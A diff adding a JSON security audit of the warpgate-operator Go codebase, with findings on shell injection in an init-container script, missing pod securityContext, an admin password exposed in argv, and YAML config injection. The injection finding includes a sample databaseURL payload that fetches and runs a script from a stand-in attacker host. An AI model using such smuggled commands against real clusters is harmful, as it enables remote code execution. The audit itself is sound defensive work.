@@ -1,0 +1,75 @@
+{
+  "summary": "Reviewed the warpgate-operator Go codebase in scope (api/v1alpha1 CRD types, defaulting/validation webhooks; internal/warpgate REST client; internal/controller reconcilers; cmd/main.go). The operator manages Warpgate bastion instances and syncs users, targets, credentials and tickets to a Warpgate admin API. Credential handling (crypto/rand passwords, Secret-sourced auth, finalizer-based cleanup) is largely sound. The most notable weakness is that WarpgateInstance spec fields are interpolated unescaped into an init-container shell script, giving shell command execution in the generated pod, and the generated Deployment sets no pod/container securityContext. Overall risk is moderate: the sharpest issues require permission to create/update WarpgateInstance CRs.",
+  "coverage": [
+    "cmd/main.go",
+    "internal/warpgate/client.go",
+    "internal/warpgate/credentials.go",
+    "internal/warpgate/user.go",
+    "internal/warpgate/target.go",
+    "internal/warpgate/ticket.go",
+    "internal/controller/helpers.go",
+    "internal/controller/warpgateinstance_controller.go",
+    "internal/controller/warpgateconnection_controller.go",
+    "internal/controller/warpgatepasswordcredential_controller.go",
+    "internal/controller/warpgateuser_controller.go",
+    "internal/controller/warpgateticket_controller.go",
+    "internal/controller/warpgatetarget_controller.go",
+    "internal/controller/httproute_watcher_controller.go",
+    "api/v1alpha1/warpgateinstance_webhook.go",
+    "api/v1alpha1/warpgatepublickeycredential_webhook.go"
+  ],
+  "findings": [
+    {
+      "title": "Shell command injection via spec.databaseURL in WarpgateInstance init-container script",
+      "category": "security",
+      "cwe": "CWE-78",
+      "severity": "medium",
+      "confidence": "high",
+      "file": "internal/controller/warpgateinstance_controller.go",
+      "line_start": 556,
+      "line_end": 558,
+      "description": "buildDeployment assembles an init-container script that is executed with `/bin/sh -c <script>` (command array built at lines 772-791). The user-controlled WarpgateInstance field spec.databaseURL is concatenated into that script unescaped, wrapped only in double quotes. A WarpgateInstance author can set databaseURL to e.g. `sqlite:/data/db\"; wget http://attacker/x -O /tmp/x; sh /tmp/x; echo \"` to break out of the quoting and run arbitrary commands as the init container's user (root, since the script runs `apk add`) in the instance pod. The WarpgateInstance validating webhook (api/v1alpha1/warpgateinstance_webhook.go:200-268) performs no sanitisation of databaseURL. Reachable by any principal with RBAC to create/update warpgateinstances CRs. Note: the same unescaped-interpolation pattern also reaches the generated ConfigMap at buildWarpgateConfig (lines 345 and 380 inject databaseURL/externalHost into warpgate.yaml), which is a lower-impact config-injection sink. Realistic impact is bounded because spec.image is also attacker-controlled and unrestricted, so the same actor can already influence pod contents; the injection nonetheless bypasses any image allowlisting an operator might add and is a clear unintended code path.",
+      "evidence": "line 549-558: setupCmd := fmt.Sprintf(`warpgate ... --admin-password \"${ADMIN_PASSWORD}\"`, instanceHTTPPort(inst)); ... if inst.Spec.DatabaseURL != \"\" { setupCmd += fmt.Sprintf(` --database-url \"%s\"`, inst.Spec.DatabaseURL) }  -> initScript := strings.Join(scriptParts, \"\\n\") -> Command: []string{\"/bin/sh\", \"-c\", initScript} (line 776).",
+      "recommendation": "Do not build shell command strings from CR fields. Pass databaseURL (and the admin password) to the warpgate binary via environment variables sourced from the pod env / Secret, and reference them inside the script only as already-set env vars, or invoke the binary with an explicit argv array instead of `sh -c`. If interpolation is unavoidable, reject shell metacharacters in the validating webhook and single-quote-escape the value."
+    },
+    {
+      "title": "WarpgateInstance Deployment and init container run with no securityContext (root, no cap drop)",
+      "category": "security",
+      "cwe": "CWE-250",
+      "severity": "low",
+      "confidence": "high",
+      "file": "internal/controller/warpgateinstance_controller.go",
+      "line_start": 771,
+      "line_end": 811,
+      "description": "The PodSpec generated for every WarpgateInstance sets no Pod-level or container-level SecurityContext and no serviceAccountName. As a result the init container and the warpgate container run as root with allowPrivilegeEscalation defaulting to true, a writable root filesystem, and the full default capability set, using the namespace default ServiceAccount. For a product that fronts SSH/DB/RDP sessions (a bastion), this maximises blast radius if the warpgate process or the init script (see the command-injection finding) is compromised. There is no RunAsNonRoot, readOnlyRootFilesystem, seccompProfile, or capability drop anywhere in the controller package.",
+      "evidence": "corev1.PodSpec at lines 771-811 contains InitContainers, Containers, Volumes, NodeSelector, Tolerations but no SecurityContext field on the pod or on either container; grep for SecurityContext/RunAsNonRoot/Privileged/ServiceAccountName across internal/ returns no matches.",
+      "recommendation": "Set a restrictive securityContext on the pod and containers (runAsNonRoot: true, runAsUser non-zero, allowPrivilegeEscalation: false, readOnlyRootFilesystem where feasible, drop ALL capabilities, seccompProfile RuntimeDefault) and allow operators to override it via the CRD. Note the init container currently needs root only because it runs `apk add openssl`; prefer an image that already ships openssl so the container can run non-root."
+    },
+    {
+      "title": "Warpgate admin password exposed in process arguments of init container",
+      "category": "security",
+      "cwe": "CWE-214",
+      "severity": "low",
+      "confidence": "medium",
+      "file": "internal/controller/warpgateinstance_controller.go",
+      "line_start": 549,
+      "line_end": 552,
+      "description": "The admin password is correctly injected into the init container via an ADMIN_PASSWORD env var from a Secret, but it is then passed to the warpgate binary as a command-line argument (`--admin-password \"${ADMIN_PASSWORD}\"`). When the `/bin/sh -c` script runs, the shell expands the variable so the resulting `warpgate unattended-setup` child process has the cleartext admin password in its argv, readable via `ps`/`/proc/<pid>/cmdline` by any other process sharing the container (or with node access) during setup. The admin password controls the Warpgate bastion UI, so disclosure is significant even though the init container is short-lived.",
+      "evidence": "line 549-552: setupCmd := fmt.Sprintf(`warpgate --skip-securing-files unattended-setup --data-path /data --http-port %d --admin-password \"${ADMIN_PASSWORD}\"`, instanceHTTPPort(inst))",
+      "recommendation": "Prefer a warpgate setup flag that reads the admin password from an environment variable or a file path rather than from argv, so the secret never appears in a process command line. If only an argv flag exists, document the limitation and ensure the pod is not shared with untrusted sidecars."
+    },
+    {
+      "title": "Unescaped CR values interpolated into generated warpgate.yaml ConfigMap",
+      "category": "security",
+      "cwe": "CWE-91",
+      "severity": "low",
+      "confidence": "medium",
+      "file": "internal/controller/warpgateinstance_controller.go",
+      "line_start": 344,
+      "line_end": 345,
+      "description": "buildWarpgateConfig writes the user-controlled spec.databaseURL and spec.externalHost into the Warpgate YAML config using raw string formatting (`database_url: \"%s\"` at line 345, `external_host: %s` at line 380) with no YAML escaping. A value containing a double quote or newline can inject or alter additional YAML keys in warpgate.yaml, letting a WarpgateInstance author set Warpgate configuration options that are not exposed through the CRD. Impact is limited because spec.configOverride already lets an author supply an arbitrary warpgate.yaml by design, so this does not cross a new trust boundary, but it is an unintended injection sink worth closing.",
+      "evidence": "line 344-345: if inst.Spec.DatabaseURL != \"\" { fmt.Fprintf(&b, \"database_url: \\\"%s\\\"\\n\", inst.Spec.DatabaseURL) } ; line 379-380: if inst.Spec.ExternalHost != \"\" { fmt.Fprintf(&b, \"external_host: %s\\n\", inst.Spec.ExternalHost) }",
+      "recommendation": "Build the config with a real YAML marshaller (e.g. sigs.k8s.io/yaml / gopkg.in/yaml.v3) so string values are properly quoted and escaped, instead of hand-formatting the document, or validate/escape databaseURL and externalHost in the webhook."
+    }
+  ]
+}
